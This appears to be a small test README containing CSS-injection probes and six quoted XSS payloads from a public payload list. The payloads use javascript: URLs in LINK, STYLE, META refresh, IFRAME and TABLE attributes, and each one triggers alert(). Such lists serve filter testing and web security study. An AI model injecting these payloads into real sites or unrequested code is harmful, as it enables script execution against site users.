# xss-test
xss



<div style="font-family:'foo&#10;;color:red;';">XXX

<div style="font-family:foo}color=red;">HOLA


```
<!-- Project Name  : Cross Site Scripting ( XSS ) Vulnerability Payload List -->
<!--        Author : Ismail Tasdelen -->
<!--      Linkedin : https://www.linkedin.com/in/ismailtasdelen/ -->
<!--        GitHub : https://github.com/ismailtasdelen/ -->
<!--       Twitter : https://twitter.com/ismailtsdln -->
<!--        Medium : https://medium.com/@ismailtasdelen -->

<LINK REL="stylesheet" HREF="javascript:javascript:alert(1);">
<STYLE>li {list-style-image: url("javascript:javascript:alert(2)");}</STYLE><UL><LI>XSS
<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:javascript:alert(3);">
<META HTTP-EQUIV="refresh" CONTENT="0; URL=http://;URL=javascript:javascript:alert(4);">
<IFRAME SRC="javascript:javascript:alert(5);"></IFRAME>
<TABLE BACKGROUND="javascript:javascript:alert(6)">


```
